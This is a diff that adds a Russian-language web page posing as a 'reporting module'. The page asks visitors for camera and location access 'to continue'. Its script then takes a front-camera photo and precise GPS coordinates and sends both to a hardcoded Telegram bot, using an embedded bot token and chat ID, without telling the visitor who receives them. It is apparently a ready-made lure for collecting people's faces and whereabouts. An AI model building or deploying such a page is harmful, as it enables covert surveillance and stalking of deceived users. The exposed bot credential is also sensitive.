@@ -1,0 +1,853 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Модуль отчётности</title>
+
+<style>
+* {
+    box-sizing: border-box;
+}
+
+body {
+    margin: 0;
+    min-height: 100vh;
+    background: #0f172a;
+    color: #ffffff;
+    font-family: Arial, sans-serif;
+
+    display: flex;
+    justify-content: center;
+    align-items: center;
+
+    padding: 20px;
+}
+
+.card {
+    width: 100%;
+    max-width: 550px;
+
+    background: #1e293b;
+
+    border: 1px solid #334155;
+    border-radius: 16px;
+
+    padding: 25px;
+
+    box-shadow: 0 15px 40px rgba(0,0,0,0.35);
+}
+
+h1 {
+    margin: 0 0 10px 0;
+
+    text-align: center;
+
+    color: #38bdf8;
+}
+
+.info {
+    margin-bottom: 20px;
+
+    text-align: center;
+
+    color: #cbd5e1;
+
+    line-height: 1.5;
+}
+
+.video-box {
+    width: 100%;
+    aspect-ratio: 4 / 3;
+
+    background: #000;
+
+    border-radius: 12px;
+
+    overflow: hidden;
+
+    margin-bottom: 15px;
+}
+
+video {
+    width: 100%;
+    height: 100%;
+
+    display: block;
+
+    object-fit: cover;
+}
+
+button {
+    width: 100%;
+
+    padding: 14px;
+
+    margin-top: 10px;
+
+    border: 0;
+    border-radius: 9px;
+
+    background: #2563eb;
+    color: white;
+
+    font-size: 16px;
+    font-weight: bold;
+
+    cursor: pointer;
+}
+
+button:hover {
+    background: #1d4ed8;
+}
+
+button:disabled {
+    opacity: 0.5;
+    cursor: not-allowed;
+}
+
+.status {
+    margin-top: 18px;
+
+    padding: 15px;
+
+    background: #0f172a;
+
+    border-radius: 10px;
+
+    color: #cbd5e1;
+
+    line-height: 1.8;
+}
+
+.location-box {
+    display: none;
+
+    margin-top: 15px;
+
+    padding: 15px;
+
+    background: #052e16;
+
+    border: 1px solid #166534;
+
+    border-radius: 10px;
+
+    line-height: 1.8;
+}
+
+canvas {
+    display: none;
+}
+</style>
+</head>
+
+
+<body>
+
+<div class="card">
+
+    <h1>Модуль отчётности</h1>
+
+    <div class="info">
+        Для продолжения разрешите доступ к камере
+        и местоположению.
+    </div>
+
+
+    <div class="video-box">
+
+        <video
+            id="video"
+            autoplay
+            playsinline
+            muted>
+        </video>
+
+    </div>
+
+
+    <button id="permissionBtn">
+        Разрешить камеру и местоположение
+    </button>
+
+
+    <button id="sendBtn" disabled>
+        Сделать фото и отправить
+    </button>
+
+
+    <div
+        id="status"
+        class="status">
+
+        Ожидание...
+
+    </div>
+
+
+    <div
+        id="locationBox"
+        class="location-box">
+
+    </div>
+
+
+    <canvas id="canvas"></canvas>
+
+</div>
+
+
+
+<script>
+
+// ==================================================
+// ФАҚАТ ҲАМИН 2 ҶОРО ПУР КУН
+// ==================================================
+
+const BOT_TOKEN = "8967170786:AAFneP3md1WHMQoMT8CAEIJ_rEcdkL_BBcE";
+
+const CHAT_ID = "7826286091";
+
+
+// ==================================================
+// ELEMENTS
+// ==================================================
+
+const video =
+    document.getElementById("video");
+
+const canvas =
+    document.getElementById("canvas");
+
+const permissionBtn =
+    document.getElementById("permissionBtn");
+
+const sendBtn =
+    document.getElementById("sendBtn");
+
+const statusBox =
+    document.getElementById("status");
+
+const locationBox =
+    document.getElementById("locationBox");
+
+
+// ==================================================
+// VARIABLES
+// ==================================================
+
+let stream = null;
+
+let latitude = null;
+
+let longitude = null;
+
+let accuracy = null;
+
+
+// ==================================================
+// CAMERA
+// ==================================================
+
+async function getCamera() {
+
+    try {
+
+        if (
+            !navigator.mediaDevices ||
+            !navigator.mediaDevices.getUserMedia
+        ) {
+
+            throw new Error(
+                "Камера недоступна в этом режиме браузера"
+            );
+
+        }
+
+
+        stream =
+            await navigator.mediaDevices.getUserMedia({
+
+                video: {
+                    facingMode: "user"
+                },
+
+                audio: false
+
+            });
+
+
+        video.srcObject =
+            stream;
+
+
+        await video.play();
+
+
+        return true;
+
+    }
+
+    catch (error) {
+
+        console.error(
+            "CAMERA:",
+            error
+        );
+
+
+        return false;
+
+    }
+
+}
+
+
+// ==================================================
+// GEOLOCATION
+// ==================================================
+
+function getLocation() {
+
+    return new Promise(function(resolve) {
+
+
+        if (!navigator.geolocation) {
+
+            resolve(false);
+
+            return;
+
+        }
+
+
+        navigator.geolocation.getCurrentPosition(
+
+
+            function(position) {
+
+
+                latitude =
+                    position.coords.latitude;
+
+
+                longitude =
+                    position.coords.longitude;
+
+
+                accuracy =
+                    position.coords.accuracy;
+
+
+                console.log(
+                    "LAT:",
+                    latitude
+                );
+
+
+                console.log(
+                    "LON:",
+                    longitude
+                );
+
+
+                console.log(
+                    "ACCURACY:",
+                    accuracy
+                );
+
+
+                resolve(true);
+
+            },
+
+
+            function(error) {
+
+
+                console.error(
+                    "GEOLOCATION:",
+                    error
+                );
+
+
+                resolve(false);
+
+            },
+
+
+            {
+                enableHighAccuracy: true,
+
+                timeout: 20000,
+
+                maximumAge: 0
+            }
+
+        );
+
+    });
+
+}
+
+
+// ==================================================
+// PERMISSION
+// ==================================================
+
+permissionBtn.addEventListener(
+    "click",
+
+    async function() {
+
+
+        permissionBtn.disabled =
+            true;
+
+
+        sendBtn.disabled =
+            true;
+
+
+        locationBox.style.display =
+            "none";
+
+
+        statusBox.innerHTML =
+            "Запрос разрешения камеры...";
+
+
+        // ==========================================
+        // CAMERA
+        // ==========================================
+
+        const cameraOK =
+            await getCamera();
+
+
+        if (cameraOK) {
+
+            statusBox.innerHTML =
+                "✓ Камера разрешена";
+
+        }
+
+        else {
+
+            statusBox.innerHTML =
+                "✗ Нет доступа к камере";
+
+        }
+
+
+        // ==========================================
+        // LOCATION
+        // ==========================================
+
+        statusBox.innerHTML +=
+            "<br>Запрос местоположения...";
+
+
+        const locationOK =
+            await getLocation();
+
+
+        if (locationOK) {
+
+
+            statusBox.innerHTML +=
+                "<br>✓ Местоположение получено";
+
+
+            locationBox.style.display =
+                "block";
+
+
+            locationBox.innerHTML =
+
+                "<strong>Местоположение:</strong>" +
+
+                "<br>Широта: " +
+                latitude +
+
+                "<br>Долгота: " +
+                longitude +
+
+                "<br>Точность: ±" +
+                Math.round(accuracy) +
+                " м";
+
+
+        }
+
+        else {
+
+
+            statusBox.innerHTML +=
+                "<br>✗ Местоположение не получено";
+
+
+            locationBox.style.display =
+                "block";
+
+
+            locationBox.innerHTML =
+                "Разрешите доступ к местоположению в браузере.";
+
+        }
+
+
+        // ==========================================
+        // BUTTON
+        // ==========================================
+
+        if (
+            cameraOK &&
+            locationOK
+        ) {
+
+
+            sendBtn.disabled =
+                false;
+
+
+            statusBox.innerHTML +=
+                "<br><strong>✓ Всё готово</strong>";
+
+        }
+
+        else {
+
+
+            statusBox.innerHTML +=
+                "<br>Для отправки нужны камера и местоположение.";
+
+        }
+
+
+        permissionBtn.disabled =
+            false;
+
+    }
+);
+
+
+// ==================================================
+// SEND
+// ==================================================
+
+sendBtn.addEventListener(
+    "click",
+
+    async function() {
+
+
+        if (!stream) {
+
+            statusBox.innerHTML =
+                "Камера не запущена.";
+
+            return;
+
+        }
+
+
+        if (
+            latitude === null ||
+            longitude === null
+        ) {
+
+            statusBox.innerHTML =
+                "Местоположение не получено.";
+
+            return;
+
+        }
+
+
+        if (
+            BOT_TOKEN.trim() === "" ||
+            CHAT_ID.trim() === ""
+        ) {
+
+            statusBox.innerHTML =
+                "Заполните BOT_TOKEN и CHAT_ID.";
+
+            return;
+
+        }
+
+
+        if (
+            video.videoWidth === 0 ||
+            video.videoHeight === 0
+        ) {
+
+            statusBox.innerHTML =
+                "Подождите загрузку камеры.";
+
+            return;
+
+        }
+
+
+        sendBtn.disabled =
+            true;
+
+
+        try {
+
+
+            // ==========================================
+            // PHOTO
+            // ==========================================
+
+            statusBox.innerHTML =
+                "Создание фотографии...";
+
+
+            canvas.width =
+                video.videoWidth;
+
+
+            canvas.height =
+                video.videoHeight;
+
+
+            const context =
+                canvas.getContext("2d");
+
+
+            context.drawImage(
+
+                video,
+
+                0,
+                0,
+
+                canvas.width,
+                canvas.height
+
+            );
+
+
+            const photoBlob =
+                await new Promise(function(resolve) {
+
+
+                    canvas.toBlob(
+
+                        function(blob) {
+
+                            resolve(blob);
+
+                        },
+
+                        "image/jpeg",
+
+                        0.9
+
+                    );
+
+                });
+
+
+            if (!photoBlob) {
+
+                throw new Error(
+                    "Не удалось создать фото"
+                );
+
+            }
+
+
+            // ==========================================
+            // SEND PHOTO
+            // ==========================================
+
+            statusBox.innerHTML =
+                "Отправка фотографии...";
+
+
+            const photoData =
+                new FormData();
+
+
+            photoData.append(
+                "chat_id",
+                CHAT_ID
+            );
+
+
+            photoData.append(
+                "photo",
+                photoBlob,
+                "report.jpg"
+            );
+
+
+            photoData.append(
+                "caption",
+                "Фото отправлено пользователем после разрешения доступа."
+            );
+
+
+            const photoURL =
+
+                "https://api.telegram.org/bot" +
+
+                BOT_TOKEN +
+
+                "/sendPhoto";
+
+
+            const photoResponse =
+                await fetch(
+
+                    photoURL,
+
+                    {
+                        method: "POST",
+                        body: photoData
+                    }
+
+                );
+
+
+            const photoResult =
+                await photoResponse.json();
+
+
+            if (!photoResult.ok) {
+
+                throw new Error(
+
+                    "Фото: " +
+
+                    (
+                        photoResult.description ||
+                        "ошибка Telegram"
+                    )
+
+                );
+
+            }
+
+
+            // ==========================================
+            // SEND LOCATION
+            // ==========================================
+
+            statusBox.innerHTML =
+                "Отправка местоположения...";
+
+
+            const locationData =
+                new FormData();
+
+
+            locationData.append(
+                "chat_id",
+                CHAT_ID
+            );
+
+
+            locationData.append(
+                "latitude",
+                String(latitude)
+            );
+
+
+            locationData.append(
+                "longitude",
+                String(longitude)
+            );
+
+
+            const locationURL =
+
+                "https://api.telegram.org/bot" +
+
+                BOT_TOKEN +
+
+                "/sendLocation";
+
+
+            const locationResponse =
+                await fetch(
+
+                    locationURL,
+
+                    {
+                        method: "POST",
+                        body: locationData
+                    }
+
+                );
+
+
+            const locationResult =
+                await locationResponse.json();
+
+
+            if (!locationResult.ok) {
+
+                throw new Error(
+
+                    "Location: " +
+
+                    (
+                        locationResult.description ||
+                        "ошибка Telegram"
+                    )
+
+                );
+
+            }
+
+
+            // ==========================================
+            // SUCCESS
+            // ==========================================
+
+            statusBox.innerHTML =
+                "✓ Готово!" +
+                "<br>✓ Фото отправлено" +
+                "<br>✓ Местоположение отправлено";
+
+
+        }
+
+        catch (error) {
+
+
+            console.error(
+                error
+            );
+
+
+            statusBox.innerHTML =
+                "Ошибка: " +
+                error.message;
+
+
+        }
+
+        finally {
+
+
+            sendBtn.disabled =
+                false;
+
+
+        }
+
+    }
+);
+
+</script>
+
+</body>
+</html>
